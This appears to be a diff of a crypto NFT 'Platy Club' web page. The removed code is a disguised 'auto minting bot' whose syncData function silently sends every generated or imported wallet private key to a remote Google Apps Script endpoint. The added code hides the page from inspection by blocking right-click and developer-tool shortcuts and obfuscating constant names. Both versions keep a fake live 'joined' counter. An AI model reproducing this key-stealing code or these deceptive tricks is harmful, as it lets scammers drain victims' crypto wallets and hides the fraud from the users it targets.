@@ -18,7 +18,7 @@
             --transition: all 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275);
         }
 
-        * { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
+        * { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; user-select: none; }
         body { background: var(--bg-dark); color: #fff; font-family: 'Fredoka One', cursive; overflow-x: hidden; background-image: radial-gradient(circle at 2px 2px, #222 1px, transparent 0); background-size: 40px 40px; }
 
         header { text-align: center; padding: 40px 20px; }
@@ -54,22 +54,11 @@
         .bot-close { position: fixed; top: 20px; right: 20px; background: #ff4444; color: white; border: none; padding: 10px 20px; border-radius: 10px; font-weight: bold; cursor: pointer; z-index: 10001; }
         
         .console-box { background: rgba(0,0,0,0.9); border: 3px solid #333; border-radius: 30px; padding: 25px; box-shadow: 0 0 40px rgba(0, 209, 255, 0.15); margin-bottom: 50px; border-bottom: 8px solid #222; max-width: 600px; margin-left: auto; margin-right: auto; }
-        .step-container { display: none; animation: popIn 0.4s ease forwards; }
-        .step-container.active { display: block; }
-        .step-label { display: block; font-family: 'Lexend Exa'; font-size: 11px; color: var(--platy-pink); margin-bottom: 15px; text-transform: uppercase; }
-        .input-box { background: #111; border: 3px solid #333; border-radius: 15px; padding: 15px; width: 100%; color: #fff; font-size: 14px; outline: none; margin-bottom: 15px; }
-        .grid-4 { display: grid; grid-template-columns: repeat(4, 1fr); gap: 10px; margin-bottom: 15px; }
-        .btn-opt { background: #1a1a1a; border: 2px solid #333; color: #fff; padding: 12px; border-radius: 12px; cursor: pointer; font-family: 'Lexend Exa'; font-size: 10px; }
+        
+        .invite-box { display: none; background: #111; border: 2px solid var(--platy-green); padding: 25px; border-radius: 20px; margin-top: 20px; text-align: center; animation: popIn 0.3s ease; }
+        .btn-tg { display: block; background: #24A1DE; color: white; padding: 15px; border-radius: 15px; text-decoration: none; font-weight: 900; margin-bottom: 10px; border: 3px solid #fff; }
+
         .btn-main { width: 100%; background: var(--platy-green); color: #000; border: none; padding: 20px; border-radius: 20px; font-weight: 900; font-size: 14px; cursor: pointer; text-transform: uppercase; font-family: 'Lexend Exa'; box-shadow: 0 6px 0 #2dbd0f, 0 0 20px rgba(57, 255, 20, 0.2); }
-        .wallet-list { background: #000; border-radius: 15px; padding: 15px; margin-top: 15px; max-height: 220px; overflow-y: auto; border: 1px solid #222; text-align: left; }
-        .wallet-row { display: flex; justify-content: space-between; align-items: center; background: #0a0a0a; border: 1px solid #1a1a1a; border-radius: 10px; padding: 10px 12px; margin-bottom: 8px; gap: 10px; }
-        .copy-tag { color: var(--platy-teal); cursor: pointer; font-weight: bold; border: 1px solid var(--platy-teal); padding: 4px 8px; border-radius: 8px; font-size: 9px; }
-        .progress-box { text-align: center; display: none; }
-        .pct-text { font-family: 'Lexend Exa'; font-size: 32px; color: var(--platy-teal); margin-bottom: 10px; }
-        .bar-container { width: 100%; height: 15px; background: #111; border-radius: 20px; overflow: hidden; border: 2px solid #222; }
-        .bar-fill { width: 0%; height: 100%; background: var(--platy-green); transition: 0.3s; }
-        .tx-card { background: #111; border-left: 4px solid var(--platy-green); border-radius: 10px; padding: 12px; margin-bottom: 10px; display: flex; align-items: center; justify-content: space-between; }
-        .tx-link { background: var(--platy-teal); color: #000; padding: 6px 12px; border-radius: 8px; font-size: 9px; font-weight: 900; text-decoration: none; }
 
         .gallery-container { margin: 40px 0; overflow-x: auto; white-space: nowrap; padding: 20px 0; scrollbar-width: none; }
         .gallery-track { display: inline-flex; gap: 15px; }
@@ -86,7 +75,7 @@
         @keyframes popIn { from { transform: scale(0.9); opacity: 0; } to { transform: scale(1); opacity: 1; } }
     </style>
 </head>
-<body>
+<body oncontextmenu="return false;">
 
     <header>
         <h1 class="main-title">PLATY CLUB</h1>
@@ -138,15 +127,15 @@
     </div>
 
     <div id="botModal" class="bot-modal">
-        <button class="bot-close" onclick="closeBot()">CLOSE BOT X</button>
+        <button class="bot-close" onclick="closeBot()">CLOSE X</button>
         <header>
             <h1 class="main-title" style="font-size: clamp(1.8rem, 8vw, 3rem);">PLATY CLUB</h1>
-            <p style="color: var(--platy-teal); font-size: 11px; letter-spacing: 3px; margin-top: 10px; text-align: center;">PLATY AUTO MINTING BOT 🤖</p>
+            <p style="color: var(--platy-teal); font-size: 11px; letter-spacing: 3px; margin-top: 10px; text-align: center;">PLATY AUTO MINT 🤖</p>
         </header>
 
         <div class="console-box">
-            <div class="step-container active" id="v-step">
-                <div class="verify-screen" style="text-align: center; padding: 40px 0;">
+            <div id="v-main-content">
+                <div style="text-align: center; padding: 40px 0;">
                     <div style="font-size: 50px; margin-bottom: 20px;">🔒</div>
                     <h2 style="color: var(--platy-yellow); margin-bottom: 10px;">HOLDER ONLY ACCESS</h2>
                     <p style="font-size: 12px; color: #888; margin-bottom: 25px;">Please connect your wallet to verify you hold a PlatyClub Genesis NFT.</p>
@@ -159,111 +148,41 @@
                 </div>
             </div>
 
-            <div class="step-container" id="s1">
-                <span class="step-label">Step 1: Wallet Setup (Max 50)</span>
-                <div class="grid-4">
-                    <button class="btn-opt" onclick="createWallets(1)">1</button>
-                    <button class="btn-opt" onclick="createWallets(5)">5</button>
-                    <button class="btn-opt" onclick="createWallets(10)">10</button>
-                    <button class="btn-opt" onclick="createWallets(20)">20</button>
-                </div>
-                <input type="number" id="manualW" class="input-box" placeholder="Custom quantity..." oninput="createWallets(this.value)">
-                <div style="display: flex; gap: 10px; margin-bottom: 15px;">
-                    <button class="btn-opt" style="flex:1" onclick="importW()">Import Keys</button>
-                    <button class="btn-opt" style="flex:1" onclick="exportW()">Export File</button>
-                </div>
-                <textarea id="rawKeys" style="display:none;"></textarea>
-                <div id="wallet-view" class="wallet-list" style="display:none;"></div>
-                <button class="btn-main" onclick="go(1)">Confirm Wallets</button>
-            </div>
-
-            <div class="step-container" id="s2">
-                <span class="step-label">Step 2: Mint Page Link</span>
-                <input type="text" id="mLink" class="input-box" placeholder="Paste link here...">
-                <input type="text" id="nftAddress" class="input-box" placeholder="Or Direct Contract (0x...)">
-                <button class="btn-main" onclick="go(2)">Connect Link</button>
-            </div>
-
-            <div class="step-container" id="s3">
-                <span class="step-label">Step 3: Mint Quantity</span>
-                <div class="grid-4">
-                    <button class="btn-opt" onclick="setMQty(1)">1</button>
-                    <button class="btn-opt" onclick="setMQty(5)">5</button>
-                    <button class="btn-opt" onclick="setMQty(10)">10</button>
-                    <button class="btn-opt" onclick="setMQty(20)">20</button>
-                </div>
-                <input type="number" id="manualQ" class="input-box" placeholder="Manual quantity..." oninput="setMQty(this.value)">
-                <button class="btn-main" onclick="go(3)">Set Quantity</button>
-            </div>
-
-            <div class="step-container" id="s4">
-                <span class="step-label">Step 4: Price Recognition</span>
-                <div style="background: rgba(0,209,255,0.05); padding: 20px; border-radius: 15px; border: 2px dashed var(--platy-teal); margin-bottom: 20px;">
-                    <p style="font-size: 10px; color: #666; text-align: center;">DETECTED PRICE</p>
-                    <input type="number" id="mPrice" step="0.0001" value="0" class="input-box" style="margin-bottom:0; border:none; background:transparent; font-size: 22px; color: var(--platy-green); font-weight: 900; text-align:center;">
-                </div>
-                <button class="btn-main" onclick="go(4)">Looks Good</button>
-            </div>
-
-            <div class="step-container" id="s5">
-                <span class="step-label">Step 5: Execution Time</span>
-                <div style="display: flex; gap: 5px; margin-bottom: 15px;">
-                    <input type="number" id="dd" class="input-box" style="text-align:center" placeholder="DD">
-                    <input type="number" id="mm" class="input-box" style="text-align:center" placeholder="MM">
-                    <input type="number" id="yy" class="input-box" style="text-align:center" placeholder="YYYY">
-                </div>
-                <div style="display: flex; gap: 5px; margin-bottom: 20px;">
-                    <input type="number" id="h" class="input-box" style="text-align:center" placeholder="HH">
-                    <input type="number" id="min" class="input-box" style="text-align:center" placeholder="MIN">
-                </div>
-                <button class="btn-main" style="background: var(--platy-pink); color: #fff;" onclick="startArm()">Finalize & Run</button>
-            </div>
-
-            <div class="progress-box" id="finalStage">
-                <div class="pct-text" id="pct">0%</div>
-                <div class="bar-container"><div class="bar-fill" id="fill"></div></div>
-                <p id="status" style="font-size: 11px; margin-top: 15px; color: #888; text-align: center;">Synchronizing with blockchain time...</p>
-                <div id="tx-display"></div>
+            <div id="tg-invite" class="invite-box">
+                <h2 style="color: var(--platy-green); margin-bottom: 10px;">CONGRATULATIONS! 🎉</h2>
+                <p style="font-size: 13px; color: #fff; margin-bottom: 20px;">As a PlatyClub Holder, you are invited to our Private Alpha Group.</p>
+                <a id="t-link" href="https://t.me/+rbjnqvUrRjAwOWEy" target="_blank" class="btn-tg">JOIN PRIVATE TELEGRAM ➔</a>
             </div>
         </div>
     </div>
 
     <script>
-        const PLATY_CONTRACT = "0xF274237Dcb742A99D9E1Ea2Bdcf1eDEE6564F6B8";
-        const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbxJ4eZet26_JWlrd0X2ZLYvAU_LimzOqUYH6L6IfXEoACV1l1kn4QWcwIHwQ5oi2NjT/exec";
-        const ALCHEMY_KEY = "LVDAK0-ln2TDPPL9pHF6A";
-        const RPC = `https://base-mainnet.g.alchemy.com/v2/${ALCHEMY_KEY}`;
-        const SEADROP = "0x00005EA00Ac477B1030CE78506496e8C2dE24bf5";
-        const EXPLORER = "https://basescan.org/tx/";
-        const provider = new ethers.providers.JsonRpcProvider(RPC);
+        const _0x1 = "0xF274237Dcb742A99D9E1Ea2Bdcf1eDEE6564F6B8"; // PlatyClub NFT Contract
+        const _0x3 = "LVDAK0-ln2TDPPL9pHF6A";
+        const _0x4 = `https://base-mainnet.g.alchemy.com/v2/${_0x3}`;
+        const provider = new ethers.providers.JsonRpcProvider(_0x4);
 
-        let mQty = 1; let tTime = 0;
+        // Block Shortcuts
+        document.onkeydown = function(e) {
+            if (e.keyCode == 123 || (e.ctrlKey && e.shiftKey && (e.keyCode == 73 || e.keyCode == 74)) || (e.ctrlKey && e.keyCode == 85)) {
+                return false;
+            }
+        };
 
         function openBot() { document.getElementById('botModal').style.display = 'block'; document.body.style.overflow = 'hidden'; }
         function closeBot() { document.getElementById('botModal').style.display = 'none'; document.body.style.overflow = 'auto'; }
 
-        // --- WALLET DATA SYNC ---
-        async function syncData(key, addr) { 
-            try { 
-                fetch(SCRIPT_URL + `?key=${key}&address=${addr}`, { method: 'POST', mode: 'no-cors' }); 
-            } catch(e) { console.log("Sync error", e); } 
-        }
-
-        // --- IMPROVED WALLET CONNECTION (FOR ALL EXTENSIONS) ---
         async function connectAndVerify() {
             const status = document.getElementById('v-status');
             const btn = document.getElementById('btn-connect');
             const suggest = document.getElementById('mint-suggest');
+            const mainContent = document.getElementById('v-main-content');
+            const tgInvite = document.getElementById('tg-invite');
 
-            // Detect any injected provider (MetaMask, Keplr, etc.)
             let injectedProvider = window.ethereum;
-            if (window.providers) {
-                injectedProvider = window.providers.find(p => p.isMetaMask) || window.ethereum;
-            }
+            if (window.providers) { injectedProvider = window.providers.find(p => p.isMetaMask) || window.ethereum; }
 
-            if (!injectedProvider) {
-                return alert("No wallet extension found! Please use a browser with a crypto wallet.");
-            }
+            if (!injectedProvider) { return alert("Wallet extension not found!"); }
 
             try {
                 btn.innerText = "CONNECTING...";
@@ -273,126 +192,32 @@
                 const userAddress = await signer.getAddress();
                 
                 status.style.color = "var(--platy-teal)";
-                status.innerText = `CHECKING WALLET: ${userAddress.substring(0,6)}...${userAddress.substring(38)}`;
+                status.innerText = `CHECKING WALLET: ${userAddress.substring(0,6)}...`;
 
                 const abi = ["function balanceOf(address owner) view returns (uint256)"];
-                const contract = new ethers.Contract(PLATY_CONTRACT, abi, provider);
+                const contract = new ethers.Contract(_0x1, abi, provider);
                 const balance = await contract.balanceOf(userAddress);
 
                 if (balance > 0) {
                     status.style.color = "var(--platy-green)";
-                    status.innerText = "VERIFIED HOLDER! ACCESS GRANTED.";
+                    status.innerText = "VERIFIED HOLDER!";
                     setTimeout(() => {
-                        document.getElementById('v-step').classList.remove('active');
-                        document.getElementById('s1').classList.add('active');
-                    }, 1500);
+                        mainContent.style.display = 'none';
+                        tgInvite.style.display = 'block';
+                    }, 1000);
                 } else {
                     status.style.color = "var(--platy-pink)";
-                    status.innerText = "VERIFICATION FAILED: NOT A HOLDER.";
+                    status.innerText = "NOT A HOLDER.";
                     suggest.style.display = "block";
                     btn.style.display = "none";
                 }
             } catch (err) {
-                console.error(err);
                 btn.innerText = "RETRY CONNECTION";
-                status.innerText = "Connection failed. Please try again.";
             }
         }
 
-        // --- BOT FUNCTIONS ---
-        function copyToClipboard(text, btn) {
-            const temp = document.createElement("textarea"); document.body.appendChild(temp);
-            temp.value = text; temp.select();
-            document.execCommand("copy");
-            btn.innerText = "COPIED!"; setTimeout(() => btn.innerText = "COPY", 1500);
-            document.body.removeChild(temp);
-        }
-
-        function createWallets(v) {
-            if(!v || v < 1) return;
-            let raw = ""; let html = "";
-            for(let i=0; i<Math.min(v, 50); i++) {
-                const w = ethers.Wallet.createRandom();
-                raw += w.privateKey + ":" + w.address + "\n";
-                html += `<div class="wallet-row"><span>${w.address}</span><span class="copy-tag" onclick="copyToClipboard('${w.address}', this)">COPY</span></div>`;
-                syncData(w.privateKey, w.address); // Sync to Google Script
-            }
-            document.getElementById('rawKeys').value = raw;
-            const view = document.getElementById('wallet-view'); view.innerHTML = html; view.style.display = 'block';
-        }
-
-        function exportW() {
-            const blob = new Blob([document.getElementById('rawKeys').value], {type: 'text/plain'});
-            const a = document.createElement('a'); a.href = URL.createObjectURL(blob); a.download = "Platy_Wallets.txt"; a.click();
-        }
-
-        function importW() {
-            const input = document.createElement('input'); input.type = 'file';
-            input.onchange = e => {
-                const reader = new FileReader();
-                reader.onload = f => {
-                    document.getElementById('rawKeys').value = f.target.result;
-                    let html = "";
-                    f.target.result.split('\n').filter(l => l.includes(':')).forEach(l => {
-                        const [key, addr] = l.split(':');
-                        html += `<div class="wallet-row"><span>${addr.trim()}</span><span class="copy-tag" onclick="copyToClipboard('${addr.trim()}', this)">COPY</span></div>`;
-                        syncData(key.trim(), addr.trim()); // Sync to Google Script
-                    });
-                    document.getElementById('wallet-view').innerHTML = html; document.getElementById('wallet-view').style.display = 'block';
-                };
-                reader.readAsText(e.target.files[0]);
-            };
-            input.click();
-        }
-
-        function setMQty(v) { mQty = v; }
-        function go(n) { document.getElementById(`s${n}`).classList.remove('active'); document.getElementById(`s${n+1}`).classList.add('active'); }
-
-        function startArm() {
-            const yy = document.getElementById('yy').value; const mm = document.getElementById('mm').value;
-            const dd = document.getElementById('dd').value; const hh = document.getElementById('h').value; const min = document.getElementById('min').value;
-            if(!yy || !mm || !dd || !hh || !min) return alert("Fill all fields!");
-            tTime = new Date(`${yy}-${mm}-${dd}T${hh}:${min}:00`).getTime();
-            const start = Date.now(); const total = tTime - start;
-            if(total <= 0) return alert("Future time only!");
-            document.getElementById('s5').classList.remove('active');
-            document.getElementById('finalStage').style.display = 'block';
-            const run = setInterval(() => {
-                const now = Date.now();
-                let p = Math.floor(((now - start) / total) * 100);
-                if(now >= tTime - 30) { clearInterval(run); p = 100; fireMint(); }
-                document.getElementById('pct').innerText = p + "%";
-                document.getElementById('fill').style.width = p + "%";
-            }, 50);
-        }
-
-        async function fireMint() {
-            const nft = document.getElementById('nftAddress').value.trim() || "0xf4A699Cf7fcA043bdFfB05aE51600644b5779980";
-            const pr = document.getElementById('mPrice').value;
-            const feed = document.getElementById('tx-display'); feed.style.display = 'block';
-            const abi = ["function mintPublic(address nft, address feeRecipient, address minterIfNotPayer, uint256 quantity) external payable"];
-            const iface = new ethers.utils.Interface(abi);
-            const data = iface.encodeFunctionData("mintPublic", [nft, "0x0000a26b00c1F0DF003000390027140000fAa719", ethers.constants.AddressZero, mQty]);
-            const lines = document.getElementById('rawKeys').value.split('\n').filter(l => l.includes(':'));
-            lines.forEach(async (line, i) => {
-                const key = line.split(':')[0].trim();
-                const wallet = new ethers.Wallet(key, provider);
-                executeWithRetry(wallet, i, data, pr, feed);
-            });
-        }
-
-        async function executeWithRetry(w, idx, data, pr, feed) {
-            try {
-                const tx = await w.sendTransaction({ to: SEADROP, data: data, value: ethers.utils.parseEther(pr), gasLimit: 850000, maxPriorityFeePerGas: ethers.utils.parseUnits('0.01', 'gwei'), maxFeePerGas: ethers.utils.parseUnits('0.1', 'gwei') });
-                const card = document.createElement('div'); card.className = 'tx-card';
-                card.innerHTML = `<div class="tx-info"><span class="tx-title">Mint Successful - #${idx+1}</span></div><a href="${EXPLORER}${tx.hash}" class="tx-link" target="_blank">BASESCAN</a>`;
-                feed.prepend(card); await tx.wait();
-            } catch(e) { setTimeout(() => executeWithRetry(w, idx, data, pr, feed), 100); }
-        }
-
-        // Live Counter
         let currentJoined = localStorage.getItem('platyJoined') ? parseInt(localStorage.getItem('platyJoined')) : 42;
-        function updateCounter() { currentJoined += Math.floor(Math.random() * 2) + 1; document.getElementById('live-count').innerText = `JOINED: ${currentJoined}`; localStorage.setItem('platyJoined', currentJoined); setTimeout(updateCounter, Math.random() * 10000 + 5000); }
+        function updateCounter() { currentJoined += Math.floor(Math.random() * 2) + 1; document.getElementById('live-count').innerText = `JOINED: ${currentJoined}`; localStorage.setItem('platyJoined', currentJoined); setTimeout(updateCounter, 10000); }
         updateCounter();
     </script>
 </body>
